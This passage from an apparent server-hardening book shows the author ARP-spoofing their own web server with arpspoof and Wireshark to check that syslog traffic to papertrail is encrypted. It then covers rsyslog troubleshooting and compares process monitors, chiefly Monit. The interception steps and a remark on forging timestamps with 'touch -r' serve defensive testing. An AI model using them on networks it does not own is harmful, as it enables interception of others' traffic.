<p>This will continue to notify <code>&lt;your server IP&gt;</code> that our MItM box MAC address belongs to <code>&lt;router IP&gt;</code>. For all intents and purposes, we (MItM box) are now <code>&lt;router IP&gt;</code> to the <code>&lt;your server IP&gt;</code> box, but our IP address does not change. Now on the web server you can see that its ARP table has been updated and because <code>arpspoof</code> keeps running, it keeps telling <code>&lt;your server IP&gt;</code> that our MItM box is the router.</p>

<figure class="code">
<div class="highlight"><pre><code></code>you@your_server:~$ ip neighbour
&lt;MItM box IP&gt; dev eth0 lladdr &lt;MItM box MAC&gt; STALE
&lt;router IP&gt; dev eth0 lladdr &lt;MItM box MAC&gt; REACHABLE
</pre></div>

</figure>

<p>Now on our MItM box, while our <code>arpspoof</code> continues to run, we <a href="https://blog.binarymist.net/2013/04/13/running-wireshark-as-non-root-user/">start Wireshark</a> listening on our <code>eth0</code> interface or what ever interface you are bound to, and you can see that all packets that the web server is sending, we are intercepting and forwarding (routing) on to the gateway.</p>

<p>Now Wireshark clearly showed that the data was encrypted. I commented out the five TLS config lines in the <code>/etc/rsyslog.conf</code> file -&gt; saved -&gt; restarted rsyslog -&gt; turned on Plain text in papertrail and could now see the messages in clear text. Now when I turned off Plain text, papertrail would no longer accept syslog events. Excellent!</p>

<p>One of the nice things about <code>arpspoof</code> is that it re-applies the original ARP mappings once it is done.</p>

<p>You can also tell <code>arpspoof</code> to poison the routers ARP table. This way any traffic going to the web server via the router, not originating from the web server will be routed through our MItM box also.</p>

<p>Do not forget to revert the change to <code>/proc/sys/net/ipv4/ip_forward</code>.</p>

<p>
  <strong>Exporting Wireshark Capture</strong>
</p>

<p>You can use the File-&gt;Save As option here for a collection of output types, or the way I usually do it is:</p>

<ol class="numeric">
  <li>First completely expand all the frames you want visible in your capture file</li>
  <li>File -&gt; Export Packet Dissections -&gt; as Plain Text file</li>
  <li>Check the All packets check-box</li>
  <li>Check the Packet summary line check-box</li>
  <li>Check the Packet details: check-box and the As displayed</li>
  <li>OK</li>
</ol>

<p>
  <strong>Trouble-shooting Messages that papertrail Never Shows</strong>
</p>

<aside>
  <p>To run rsyslogd in <a href="http://www.rsyslog.com/doc/v5-stable/troubleshooting/troubleshoot.html#debug-log">debug</a></p>

</aside>

<p>Check to see which arguments get passed into rsyslogd to run as a daemon in <code>/etc/init.d/rsyslog</code> and <code>/etc/default/rsyslog</code>. You will probably see a <code>RSYSLOGD_OPTIONS=""</code>. There may be some arguments between the quotes.</p>

<figure class="code">
<div class="highlight"><pre><code></code>sudo service rsyslog stop
sudo /usr/sbin/rsyslogd <code class="o">[</code>your options here<code class="o">]</code> -dn &gt;&gt; ~/rsyslog-debug.log
</pre></div>

</figure>

<p>The debug log can be quite useful for trouble-shooting. Also keep your eye on the stderr as you can see if it is writing anything out (most system start-up scripts throw this away). Once you have finished collecting log: [CTRL]+[C]</p>

<figure class="code">
<div class="highlight"><pre><code></code>sudo service rsyslog start
</pre></div>

</figure>

<p>To see if rsyslog is running:</p>

<figure class="code">
<div class="highlight"><pre><code></code>pidof rsyslogd
<code class="c1"># or</code>
/etc/init.d/rsyslog status
</pre></div>

</figure>

<aside>
  <p>Turn on the <a href="http://www.rsyslog.com/doc/master/configuration/modules/impstats.html">impstats</a> module</p>

</aside>

<p>The stats it produces show when you run into errors with an output, and also the state of the queues. You can also run impstats on the receiving machine if it is in your control. Papertrail obviously is not. Put the following into your <code>rsyslog.conf</code> file at the top and restart rsyslog:</p>

<figure class="code">
<div class="highlight"><pre><code></code><code class="c1"># Turn on some internal counters to trouble-shoot missing messages</code>
module<code class="o">(</code><code class="nv">load</code><code class="o">=</code><code class="s2">"impstats"</code>
<code class="nv">interval</code><code class="o">=</code><code class="s2">"600"</code>
<code class="nv">severity</code><code class="o">=</code><code class="s2">"7"</code>
log.syslog<code class="o">=</code><code class="s2">"off"</code>
 
<code class="c1"># need to turn log stream logging off</code>
log.file<code class="o">=</code><code class="s2">"/var/log/rsyslog-stats.log"</code><code class="o">)</code>
<code class="c1"># End turn on some internal counters to trouble-shoot missing messages</code>
</pre></div>

</figure>

<p>Now if you get an error like:</p>

<figure class="code">
<div class="highlight"><pre><code></code>rsyslogd-2039: Could not open output pipe <code class="s1">'/dev/xconsole'</code>: No such file or directory <code class="o">[</code>try htt<code class="se">\</code>
p://www.rsyslog.com/e/2039 <code class="o">]</code>
</pre></div>

</figure>

<p>You can just change the <code>/dev/xconsole</code> to <code>/dev/console</code>. Xconsole is still in the config file for legacy reasons, it has not been cleaned up by the package maintainers.</p>

<aside>
  <p>GnuTLS error in rsyslog-debug.log</p>

</aside>

<p>By running rsyslogd manually in debug mode, I found an error when the message failed to send:</p>

<figure class="code">
<div class="highlight"><pre><code></code>unexpected GnuTLS error -53 in nsd_gtls.c:1571
</pre></div>

</figure>

<p>Standard Error when running rsyslogd manually produces:</p>

<figure class="code">
<div class="highlight"><pre><code></code>GnuTLS error: Error in the push <code class="k">function</code>
</pre></div>

</figure>

<p>With some help from the GnuTLS mailing list:</p>

<p><em>That means that send() returned -1 for some reason.</em> You can enable more output by adding an environment variable <code>GNUTLS_DEBUG_LEVEL=9</code> prior to running the application, and that should at least provide you with the <code>errno</code>. This does not provide any more detail to stderr. However, <a href="https://github.com/rsyslog/rsyslog/issues/219">thanks to Rainer</a> we do now have <a href="https://github.com/jgerhards/rsyslog/commit/9125ddf99d0e5b1ea3a15a730fc409dd27df3fd9">debug.gnutls parameter</a> in the rsyslog code, that if you specify this global variable in the <code>rsyslog.conf</code> and assign it a value between 0-10 you will have gnutls debug output going to rsyslogs debug log.</p>

<h6 id="vps-countermeasures-lack-of-visibility-web-server-log-management-improving-the-strategy">Improving the Strategy</h6>

<p>With the above strategy, I had issues where messages were getting lost between rsyslog and papertrail, I spent over a week trying to find the cause. As the sender, you have no insight into what papertrail is doing. The support team could not provide much insight into their service when I had to trouble-shoot things. They were as helpful as they could be though.</p>

<p>Reliability can be significantly improved by using RELP. Papertrail does not support RELP, so a next step could be to replace papertrail with a local network instance of an rsyslogd collector and Simple Event Correlator (<a href="https://simple-evcorr.github.io/">SEC</a>). Notification for inactivity of events could be performed by cron and SEC. Then for all your graphical event correlation, you could use <a href="http://loganalyzer.adiscon.com/">LogAnalyzer</a>, also created by Rainer Gerhards (rsyslog author). This would be more work to set-up than an on-line service you do not have to set-up. In saying that. You would have greater control and security which for me is the big win here.
<a href="http://www.liblognorm.com/">Normalisation</a> also from Rainer could be useful.</p>

<p>Another option instead of going through all the work of having to set-up and configure a local network instance of an rsyslogd collector, SEC and perhaps LogAnalyzer, would be to just deploy the SyslogAppliance which is a turn-key VM already configured with all the tools you would need to collect, aggregate, report and alert, as discussed in the Network chapter under Countermeasures, <a href="chap04.html#network-countermeasures-lack-of-visibility-insufficient-logging">Insufficient Logging</a>.</p>

<p>What I found, is that after several upgrades to rsyslog, the reliability issues seemed to improve, making me think that changes to rsyslog were possibly and probably responsible.</p>

<h5 id="vps-countermeasures-lack-of-visibility-proactive-monitoring">Proactive Monitoring</h5>

<figure class="image center" style="width: 396px;">
  <img src="images/ThreatTags----PreventionAVERAGE.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p>I recently performed an in-depth evaluation of a collection of tools, that one of their responsibilities was monitoring and performing actions on your processes and applications based on some other event(s). Some of these tools are very useful for security focussed tasks as well as generic dev-ops.</p>

<p>
  <strong>New Relic</strong>
</p>

<p>New Relic is a Software as a Service (SaaS) provider that offers many products, primarily in the performance monitoring space, rather than security. Their offerings cost money, but may come into their own in larger deployments. I have used New Relic, it has been quick to start getting useful performance statistics on servers and helped my team isolate resource constraints.</p>

<p>
  <strong>Advanced Web Statistics (<a href="http://www.awstats.org/">AWStats</a>)</strong>
</p>

<p>Unlike NewRelic which is SaaS, AWStats is FOSS. It kind of fits a similar market space as NewRelic though. You can find the documentation<br />
here: <a href="http://www.awstats.org/docs/index.html">http://www.awstats.org/docs/index.html</a>.</p>

<p>
  <strong>Pingdom</strong>
</p>

<p>Similar to New Relic but not as feature rich. As discussed below, <a href="http://slides.com/tildeslash/monit#/7">Monit</a> is a better alternative.</p>

<p></p>

<p>All the following offerings that I have evaluated, target different scenarios. I have listed the pros and cons for each of them and where I think they fit into a potential solution to monitor your web applications (I am leaning toward NodeJS) and make sure they keep running in a healthy state. I have listed the <a href="chap03.html#vps-countermeasures-lack-of-visibility-proactive-monitoring-goals">goals</a> I was looking to satisfy.</p>

<p>For me I have to have a good knowledge of the landscape before I commit to a decision and stand behind it. I like to know I have made the best decision based on all the facts that are publicly available. Therefore, as always, it is my responsibility to make sure I have done my research in order to make an informed and ideally best decision possible. I am pretty sure my evaluation was un-biased, as I had not used any of the offerings other than <a href="chap03.html#vps-countermeasures-lack-of-visibility-proactive-monitoring-forever">forever</a> before.</p>

<p>I looked at quite a few more than what I have detailed below, but the following candidates I felt were worth spending some time on.</p>

<p>Keep in mind, that everyones requirements will be different, so rather than tell you which to use because I do not know your situation, I have listed the attributes (positive, negative and neutral) that I think are worth considering when making this choice. After the evaluation we make some decisions and start the <a href="chap03.html#vps-countermeasures-lack-of-visibility-proactive-monitoring-getting-started-with-monit">configuration</a> of the chosen offerings.</p>

<h6 id="leanpub-auto-evaluation-criteria">Evaluation Criteria</h6>

<ol class="numeric">
  <li>Who is the creator. I favour teams rather than individuals, because the strength, ability to be side-tracked, and affected by external influences is greater on individuals as compared to a team. If an individual moves on, where does that leave the product? With that in mind, there are some very passionate and motivated individuals running very successful projects.</li>
  <li>Does it do what we need it to do? <a href="chap03.html#vps-countermeasures-lack-of-visibility-proactive-monitoring-goals">Goals</a> address this.</li>
  <li>Do I foresee any integration problems with other required components, and how difficult are the relationships likely to be?</li>
  <li>Cost in money. Is it free, as in free beer? I usually gravitate toward free software. It is usually an easier sell to clients and management. Are there catches once you get further down the road? Usually open source projects are marketed as is, so although it costs you nothing up front, what is it likely to cost in maintenance? Do you have the resources to support it?</li>
  <li>Cost in time. Is the set-up painful?</li>
  <li>How well does it appear to be supported? What do the users say?</li>
  <li>Documentation. Is there any / much? What is its quality? Is the User Experience so good, that little documentation is required?</li>
  <li>Community. Does it have an active one? Are the users getting their questions answered satisfactorily? Why are the unhappy users unhappy (do they have a valid reason)?</li>
  <li>Release schedule. How often are releases being made? When was the last release? Is the product mature, does it need any work?</li>
  <li>Gut feeling, Intuition. How does it feel. If you have experience in making these sorts of choices, lean on it. Believe it or not, this may be the most important criteria for you.</li>
</ol>

<p>The following tools were my choice based on the above criterion.</p>

<h6 id="vps-countermeasures-lack-of-visibility-proactive-monitoring-goals">Goals</h6>

<ol class="numeric">
  <li>Application should start automatically on system boot</li>
  <li>Application should be re-started if it dies or becomes unresponsive</li>
  <li>The person responsible for the application should know if a troganised version of your application is swapped in, or even if your file time-stamps have changed</li>
  <li>Ability to add the following later without having to swap the chosen offering:
    <ol class="numeric">
      <li>Reverse proxy (Nginx, node-http-proxy, Tinyproxy, Squid, Varnish, etc)</li>
      <li>Clustering and providing load balancing for your single threaded application</li>
      <li>Visibility of <a href="chap03.html#vps-countermeasures-lack-of-visibility-statistics-graphing">application statistics</a> as we discuss a little later.</li>
    </ol>
  </li>
  <li>Enough documentation to feel comfortable consuming the offering</li>
  <li>The offering should be production ready. This means: mature with a security conscious architecture and features, rather than some attempt of security retrofitted somewhere down the track. Do the developers think and live security, thus bake the concept in from the start?</li>
</ol>

<h6 id="vps-countermeasures-lack-of-visibility-proactive-monitoring-sysvinit-upstart-systemd-runit">Sysvinit, <a href="http://upstart.ubuntu.com/">Upstart</a>, <a href="https://freedesktop.org/wiki/Software/systemd/">systemd</a> &amp; <a href="http://smarden.org/runit/">Runit</a>
</h6>

<p>You will have one of these running on your standard GNU/Linux box.</p>

<p>These are system and service managers for Linux. Upstart and the later systemd were developed as replacements for the traditional init daemon (Sysvinit), which all depend on init. Init is an essential package that pulls in the default init system. In Debian, starting with Jessie, <a href="https://wiki.debian.org/systemd">systemd</a> is your default system and service manager.</p>

<p>There is some helpful info on the <a href="https://doc.opensuse.org/documentation/html/openSUSE_122/opensuse-reference/cha.systemd.html">differences</a> between Sysvinit and systemd, links in the attributions chapter.</p>

<p id="vps-countermeasures-lack-of-visibility-proactive-monitoring-sysvinit-upstart-systemd-runit-systemd"><strong>systemd</strong>  </p>

<p>As I have systemd installed out of the box on my test machine (Debian Stretch), I will be using this for my set-up.</p>

<p>
  <strong>Documentation</strong>
</p>

<p>There is a well written <a href="http://www.tuicool.com/articles/qy2EJz3">comparison</a> with Upstart, systemd, Runit and even Supervisor.</p>

<p>Running the likes of the below commands will provide some good details on how these packages interact with each other:</p>

<figure class="code">
<div class="highlight"><pre><code></code>aptitude show sysvinit
aptitude show systemd
<code class="c1"># and any others you think of</code>
</pre></div>

</figure>

<p>These system and service managers all run as <code>PID 1</code> and start the rest of your system. Your Linux system will more than likely be using one of these to start tasks and services during boot, stop them during shutdown and supervise them while the system is running. Ideally you are going to want to use something higher level to look after your NodeJS application(s). See the following candidates.</p>

<h6 id="vps-countermeasures-lack-of-visibility-proactive-monitoring-forever">
  <a href="https://github.com/foreverjs/forever">forever</a>
</h6>

<p>and its <a href="https://github.com/FGRibreau/forever-webui">web UI</a> can run any kind of script continuously (whether it is written in NodeJS or not). This was not always the case though. It was originally targeted toward keeping NodeJS applications running.</p>

<p>Requires NPM to <a href="https://www.npmjs.com/package/forever">install globally</a>. We already have a package manager on Debian and all other main-stream Linux distros. Even Windows has package managers. Installing NPM just adds more attack surface area. Unless it is essential, I would rather do without NPM on a production server where we are actively working to <a href="chap03.html#vps-countermeasures-disable-remove-services-harden-what-is-left">reduce the installed package count</a> and <a href="chap03.html#vps-countermeasures-disable-remove-services-harden-what-is-left-disable-exim">disable</a> everything else we can. We could install forever on a development box and then copy to the production server, but it starts to turn the simplicity of a node module into something not as simple, which then makes native offerings such as <a href="chap03.html#vps-countermeasures-lack-of-visibility-proactive-monitoring-supervisor">Supervisor</a>, <a href="chap03.html#vps-countermeasures-lack-of-visibility-proactive-monitoring-monit">Monit</a> and even <a href="chap03.html#vps-countermeasures-lack-of-visibility-proactive-monitoring-passenger">Passenger</a> look even more attractive.</p>

<p>
  <strong>
    <a href="chap03.html#vps-countermeasures-lack-of-visibility-proactive-monitoring-goals">Does it Meet Our Goals</a>
  </strong>
</p>

<ol class="numeric">
  <li>Not without an extra script. Crontab or similar</li>
  <li>The application will be re-started if it dies, but if its response times go up, forever is not going to help. It has no way of knowing.</li>
  <li>forever provides no file integrity or times-tamp checking, so there is nothing stopping your application files being swapped for trojanised counterfeits with forever</li>
  <li>Ability to add the following later without having to swap the chosen offering:
    <ol class="numeric">
      <li>Reverse proxy: I do not see a problem</li>
      <li>Integrate NodeJSs core module <a href="https://nodejs.org/api/cluster.html">cluster</a> into your NodeJS application for load balancing</li>
      <li>Visibility of application statistics could be added later with the likes of <a href="chap03.html#vps-countermeasures-lack-of-visibility-proactive-monitoring-monit">Monit</a> or something else, but if you used Monit, then there would not really be a need for forever, as Monit does the little that forever does and is capable of so much more, but is not pushy on what to do and how to do it. All the behaviour is defined with quite a nice syntax in a config file or as many as you like.</li>
    </ol>
  </li>
  <li>There is enough documentation to feel comfortable consuming forever, as forever does not do a lot, which is not a bad trait to have</li>
  <li>The code it self is probably production ready, but I have heard quite a bit about stability issues. You are also expected to have NPM installed (more attack surface in the form of an application whos sole purpose is to install more packages, which goes directly against what we are trying to achieve by minimising the attack surface) when we already have native package managers on the server(s).</li>
</ol>

<p>
  <strong>Overall Thoughts</strong>
</p>

<p>For me, I am looking for a tool set that is a little smarter, knows when the application is struggling and when someone has tampered with it. Forever does not satisfy the requirements. There is often a balancing act between not doing enough and doing too much. If the offering can do to much but does not actually do it (get in your way), then it is not so bad, as you do not have to use all the features. In saying that, it is extra attack surface area that can and will be exploited, it is just a matter of time.</p>

<h6 id="leanpub-auto-pm2httppm2keymetricsio">
  <a href="http://pm2.keymetrics.io/">PM2</a>
</h6>

<p>Younger than forever, but seems to have quite a few more features. I am not sure about production ready though. Let us elaborate.</p>

<p>I prefer the dark cockpit approach from my monitoring tools. What I mean by that is, I do not want to be told that everything is OK all the time. I only want to be notified when things are not OK. PM2 provides a display of memory and cpu usage of each app with <code>pm2 monit</code>, I do not have the time to sit around watching statistics that do not need to be watched and most system administrators do not either, besides, when we do want to do this, we have perfectly good native tooling that system administrators are comfortable using. Amongst the list of <a href="https://github.com/Unitech/pm2#commands-overview">commands that PM2 provides</a>, most of this functionality can be performed by native tools, so I am not sure what benefit this adds.</p>

<p>PM2 also seems to <a href="https://github.com/Unitech/pm2#log-facilities">provide logging</a>. My applications provide their <a href="chap06.html#web-applications-countermeasures-lack-of-visibility-insufficient-logging">own logging</a> and we have the <a href="chap03.html#vps-countermeasures-lack-of-visibility-logging-and-alerting">systems logging</a> which provides aggregates and singular logs, so again I struggle to see what PM2 is offering here that we do not already have.</p>

<p>As mentioned on the <a href="https://github.com/Unitech/pm2">github</a> README: <em>PM2 is a production process manager for Node.js applications with a built-in load balancer</em>. This Sounds and at the initial glance looks shiny. Very quickly you should realise there are a few security issues you need to be aware of though.</p>

<p>The word production is used but it requires NPM to install globally. We already have a package manager on Debian and all other main-stream Linux distros. As previously mentioned, installing NPM adds unnecessary attack surface area. Unless it is essential and it should not be, we really do not want another application whos sole purpose is to install additional attack surface in the form of extra packages. NPM contains a huge number of packages, that we really do not want access to on a production server facing the internet. We could install PM2 on a development box and then copy to the production server, but it starts to turn the simplicity of a node module into something not as simple, which then, as does forever, makes offerings like <a href="chap03.html#vps-countermeasures-lack-of-visibility-proactive-monitoring-supervisor">Supervisor</a>, <a href="chap03.html#vps-countermeasures-lack-of-visibility-proactive-monitoring-monit">Monit</a> and even <a href="chap03.html#vps-countermeasures-lack-of-visibility-proactive-monitoring-passenger">Passenger</a> look even more attractive.</p>

<p>At the time of writing this, PM2 is about four years old with about 440 open issues on github, most quite old, with 29 open pull requests.</p>

<p>Yes, it is very popular currently. That does not tell me it is ready for production though. It tells me the marketing is working.</p>

<p><a href="https://github.com/Unitech/PM2/blob/master/ADVANCED_README.md#is-my-production-server-ready-for-pm2">Is your production server ready for PM2</a>? That phrase alone tells me the mind-set behind the project. I would much sooner see it worded the other way around. Is PM2 ready for my production server? Your production server(s) are what you have spent time hardening, I am not personally about to compromise that work by consuming a package that shows me no sign of up-front security considerations in the development of this tool. You are going to need a development server for this, unless you honestly want development tools installed on your production server (NPM, git, build-essential and NVM) on your production server? Not for me or my clients thanks.</p>

<p>If you have considered the above concerns and can justify adding the additional attack surface area, check out the features if you have not already.</p>

<p>
  <strong>Features that Stand Out</strong>
</p>

<p>They are also listed on the github repository. Just beware of some of the caveats. Like for the <a href="https://github.com/Unitech/pm2#load-balancing--0s-reload-downtime">load balancing</a>: <em>we recommend the use of node#0.12.0+ or node#0.11.16+. We do not support node#0.10.*s cluster module anymore</em>. 0.11.16 is unstable, but hang-on, I thought PM2 was a production process manager? OK, so were happy to mix unstable in with something we label as production?</p>

<p>On top of NodeJS, PM2 will run the following scripts: bash, python, ruby, coffee, php, perl.</p>

<p>After working through the offered features, I struggled to find value in features that were not already offered natively as part of the GNU/Linux Operation System.</p>

<p>PM2 has <a href="https://github.com/Unitech/PM2/blob/master/ADVANCED_README.md#startup-script">Start-up Script Generation</a>, which sounds great, but if using systemd as we do below, then it is just a few lines of config for <a href="chap03.html#vps-countermeasures-lack-of-visibility-proactive-monitoring-keep-nodejs-application-alive">our unit file</a>. This is a similar process no matter what init system you have out of the box.</p>

<p>
  <strong>Documentation</strong>
</p>

<p>The documentation has nice eye candy which I think helps to sell PM2.</p>

<p>PM2 has what they call an Advanced <a href="https://github.com/Unitech/PM2/blob/master/ADVANCED_README.md">Readme</a> which at the time of reviewing, didnt appear to be very advanced and had a large collection of broken links.</p>

<p>
  <strong>Does it Meet Our Goals</strong>
</p>

<ol class="numeric">
  <li>The feature exists, unsure of how reliable it is currently though. I personally prefer to <a href="chap03.html#vps-countermeasures-lack-of-visibility-proactive-monitoring-keep-nodejs-application-alive">create my own</a> and test that it is being used by the Operating Systems native init system, that is the same system that starts everything else at boot time. There is nothing more reliable than this.</li>
  <li>Application should be re-started if it dies should not be a problem. PM2 can also restart your application if it reaches a certain memory or cpu threshold. I have not seen anything around restarting based on response times or other application health issues though.</li>
  <li>PM2 provides no file integrity or times-tamp checking, so there is nothing stopping your application files being swapped for trojanised counterfeits with PM2</li>
  <li>Ability to add the following later without having to swap the chosen offering:
    <ol class="numeric">
      <li>Reverse proxy: I do not see a problem</li>
      <li>
<a href="http://pm2.keymetrics.io/docs/usage/cluster-mode/">Clustering</a> and <a href="https://github.com/Unitech/pm2#load-balancing--zero-second-downtime-reload">load-balancing</a> is integrated.</li>
      <li>PM2 can provide a small collection of viewable statistics, nothing that can not be easily seen by native tooling though, it also offers KeyMetrics integration, except you have to sign up and <a href="https://keymetrics.io/pricing/">pay $29 per host per month</a> for it. Personally I would rather pay $0 for something with more features that is way more mature and also native to the Operating System. You will see this with <a href="https://mmonit.com/monit/">Monit</a> soon.</li>
    </ol>
  </li>
  <li>There is reasonable official documentation for the age of the project. The community supplied documentation has caught up. After working through all of the offerings and edge-cases, I feel as I usually do with NodeJS projects. The documentation does not cover all the edge-cases and the development itself misses edge cases.</li>
  <li>I have not seen much that would make me think PM2 is production ready. It may work well, but I do not see much thought in terms of security gone into this project. It has not wowd me.</li>
</ol>

<p>
  <strong>Overall Thoughts</strong>
</p>

<p>For me, the architecture does not seem to be heading in the right direction to be used on a production internet facing web server, where less is better, unless the functionality provided is truly unique and adds more value than the extra attack surface area removes. I would like to see this change, but I do not think it will, the culture is established.</p>

<aside>
  <p>The following are better suited to monitoring and managing your applications. Other than <a href="chap03.html#vps-countermeasures-lack-of-visibility-proactive-monitoring-passenger">Passenger</a>, they should all be in your repositories, which means trivial installs and configurations.</p>

</aside>

<h6 id="vps-countermeasures-lack-of-visibility-proactive-monitoring-supervisor">
  <a href="https://github.com/Supervisor/supervisor">Supervisor</a>
</h6>

<p>Supervisor is a process manager with a lot of features and a higher level of abstraction than the likes of the above mentioned <a href="chap03.html#vps-countermeasures-lack-of-visibility-proactive-monitoring-sysvinit-upstart-systemd-runit">Sysvinit, upstart, systemd, Runit</a>, etc, so it still needs to be run by an init daemon in itself.</p>

<p>From the <a href="http://supervisord.org/#supervisor-a-process-control-system">docs</a>: <em>It shares some of the same goals of programs like <a href="http://supervisord.org/glossary.html#term-daemontools">launchd, daemontools, and runit</a>. Unlike some of these programs, it is not meant to be run as a substitute for init as process id 1. Instead it is meant to be used to control processes related to a project or a customer, and is meant to start like any other program at boot time.</em> Supervisor monitors the <a href="http://supervisord.org/subprocess.html#process-states">state</a> of processes. Where as a tool like <a href="https://mmonit.com/monit/#about">Monit</a> can perform so many more types of tests and take what ever actions you define.</p>

<p>It is in the Debian <a href="https://packages.debian.org/stretch/supervisor">repositories</a> and is a trivial install on Debian and derivatives.</p>

<p>
  <strong>Documentation</strong>
</p>

<p><a href="http://supervisord.org/">Main web site</a> (ReadTheDocs)</p>

<p>
  <strong>Does it Meet Our Goals</strong>
</p>

<ol class="numeric">
  <li>Application should start automatically on system boot: Yes, that is what Supervisor does well.</li>
  <li>Application will be re-started if it dies, or becomes un-responsive. It is often difficult to get accurate up/down status on processes on UNIX. Pid-files often lie. Supervisord starts processes as sub-processes, so it always knows the true up/down status of its children. Your application may become unresponsive or can not connect to its database or any other service/resource it needs to work as expected. To be able to monitor these events and respond accordingly your application can expose a health-check interface, like <code>GET /healthcheck</code>. If everything goes well it should return <code>HTTP 200</code>, if not then <code>HTTP 5**</code> In some cases the restart of the process will solve this issue. <a href="https://superlance.readthedocs.io/en/latest/httpok.html"><code>httpok</code></a> is a Supervisor event listener which makes <code>GET</code> requests to the configured URL. If the check fails or times out, <code>httpok</code> will restart the process. To enable <code>httpok</code> the <a href="https://blog.risingstack.com/operating-node-in-production/#isitresponding">following lines</a> have to be placed in <code>supervisord.conf</code>:  </li>
</ol>

<figure class="code">
<div class="highlight"><pre><code></code>  <code class="o">[</code>eventlistener:httpok<code class="o">]</code>
  <code class="nv">command</code><code class="o">=</code>httpok -p my-api http://localhost:3000/healthcheck  
  <code class="nv">events</code><code class="o">=</code>TICK_5  
</pre></div>

</figure>

<ol class="numeric">
  <li>The person responsible for the application should know if a troganised version of your application is swapped in, or even if your file time-stamps have changed. This is not one of Supervisors responsibilities.</li>
  <li>Ability to add the following later without having to swap the chosen offering:
    <ol class="numeric">
      <li>Reverse proxy: I do not see a problem</li>
      <li>Integrate NodeJSs core module <a href="https://nodejs.org/api/cluster.html">cluster</a> into your NodeJS application for load balancing. This would be completely separate to supervisor.</li>
      <li>Visibility of application statistics could be added later with the likes of Monit or something else. For me, Supervisor does not do enough. Monit does. Plus if you need what Monit offers, then you have to have three packages to think about, or Something like Supervisor, which is not an init system, so it kind of sits in the middle of the ultimate stack. So my way of thinking is, use the init system you already have to do the low level lifting and then something small to take care of everything else on your server that the init system is not really designed for, and Monit does this job really well. Just keep in mind also. This is not based on any bias. I had not used Monit before this exercise. It has been a couple of years since a lot of this was written though and Monit has had a home in my security focussed hosting facility since then. I never look at it or touch it, Monit just lets me know when there are issues and is quiet the rest of the time.</li>
    </ol>
  </li>
  <li>Supervisor is a mature product. It has been around since 2004 and is still actively developed. The official and community provided <a href="https://serversforhackers.com/monitoring-processes-with-supervisord">docs</a> are good.</li>
  <li>Yes it is production ready. It has proven itself.</li>
</ol>

<p>
  <strong>Overall Thoughts</strong>
</p>

<p>The documentation is quite good, easy to read and understand. I felt that the config was quite intuitive also. I already had systemd installed out of the box and did not see much point in installing Supervisor as systemd appeared to do everything Supervisor could do, plus systemd is an init system, sitting at the bottom of the stack. In most scenarios you are going to have a Sysvinit or replacement of (that runs with a <code>PID</code> of <code>1</code>), so in many cases Supervisor although it is quite nice is kind of redundant.</p>

<p>Supervisor is better suited to running multiple scripts with the same runtime, for example a bunch of different client applications running on Node. This can be done with systemd and the others, but Supervisor is a better fit for this sort of thing, PM2 also looks to do a good job of running multiple scripts with the same runtime.</p>

<h6 id="vps-countermeasures-lack-of-visibility-proactive-monitoring-monit">
  <a href="https://mmonit.com/monit/">Monit</a>
</h6>

<p>Is a utility for monitoring and managing daemons or similar programs. It is mature, actively maintained, free, open source and licensed with GNU <a href="http://www.gnu.org/licenses/agpl.html">AGPL</a>.</p>

<p>It is in the debian <a href="https://packages.debian.org/stretch/monit">repositories</a> (trivial install on Debian and derivatives). The home page told me the binary was just under 500kB. The install however produced a different number:</p>

<figure class="code">
<div class="highlight"><pre><code></code>After this operation, <code class="m">765</code> kB of additional disk space will be used.
</pre></div>

</figure>

<p>Monit provides an impressive feature set for such a small package.</p>

<p>Monit provides far more visibility into the state of your application and control than any of the offerings mentioned above. It is also generic. It will manage and/or monitor anything you throw at it. It has the right level of abstraction. Often when you start working with a product you find its limitations, and they stop you moving forward, you end up settling for imperfection or you swap the offering for something else providing you have not already invested to much effort into it. For me Monit hit the sweet spot and never seems to stop you in your tracks. There always seems to be an easy to relatively easy way to get any monitoring -&gt; take action sort of task done. What I also really like is that moving away from Monit would be relatively painless also, other than what you would miss. The time investment / learning curve is very small, and some of it will be transferable in many cases. It is just config from the control file.</p>

<p id="vps-countermeasures-lack-of-visibility-proactive-monitoring-monit-features-that-stand-out">
  <strong>
    <a href="https://mmonit.com/monit/#about">Features that Stand Out</a>
  </strong>
</p>

<ul>
  <li>Ability to <a href="http://slides.com/tildeslash/monit#/1">monitor</a> files, <a href="http://slides.com/tildeslash/monit#/23">directories</a>, disks, processes, <a href="http://slides.com/tildeslash/monit#/26">programs</a>, the system, and other hosts.</li>
  <li>Can perform <a href="http://slides.com/tildeslash/monit#/21">emergency logrotates</a> if a log file suddenly grows too large too fast</li>
  <li>
<a href="http://mmonit.com/monit/documentation/monit.html#FILE-CHECKSUM-TESTING">File Checksum Testing</a>. <a href="http://slides.com/tildeslash/monit#/22">This</a> is good so long as the compromised server has not also had the tool your using to perform your verification (md5sum or sha1sum) modified, whether using the systems utilities or monit provided utilities, which would be common. That is why in cases like this, tools such as <a href="chap03.html#vps-countermeasures-lack-of-visibility-host-intrusion-detection-systems-hids-deeper-with-stealth">Stealth</a> can be a good choice to protect your monitoring tools.</li>
  <li>Testing of other attributes like ownership and access permissions. These are good, but again can be <a href="chap03.html#vps-identify-risks-lack-of-visibility">easily modified</a>.</li>
  <li>Monitoring <a href="http://slides.com/tildeslash/monit#/23">directories</a> using time-stamp. Good idea, but do not rely solely on this. time-stamps are easily modified with <code>touch -r</code>, providing you do it between Monits cycles and you do not necessarily know when they are, unless you have permissions to look at Monits control file. This provides defence in depth though.</li>
  <li>Monitoring <a href="http://slides.com/tildeslash/monit#/24">space of file-systems</a>
</li>
  <li>Has a built-in lightweight HTTP(S) interface you can use to browse the Monit server and check the status of all monitored services. From the web-interface you can start, stop and restart processes and disable or enable monitoring of services. Monit provides <a href="https://mmonit.com/monit/documentation/monit.html#MONIT-HTTPD">fine grained control</a> over who/what can access the web interface or whether it is even active or not. Again an excellent feature that you can choose to use, or not even have the extra attack surface.</li>
  <li>There is also an aggregator (<a href="https://mmonit.com/">m/monit</a>) that allows system administrators to monitor and manage many hosts at a time. Also works well on mobile devices and is available at a one off cost (reasonable price) to monitor all hosts.</li>
  <li>Once you install Monit you have to actively enable the http daemon in the <code>monitrc</code> in order to run the Monit cli and/or access the Monit http web UI. At first I thought is this broken? I could not even run <code>monit status</code> (a Monit command). ps told me Monit was running. Then I realised <strong>it is secure by default</strong>. You have to actually think about it in order to expose anything. It was this that confirmed Monit was one of the tools for me.</li>
  <li>The <a href="http://mmonit.com/monit/documentation/monit.html#THE-MONIT-CONTROL-FILE">Control File</a>
</li>
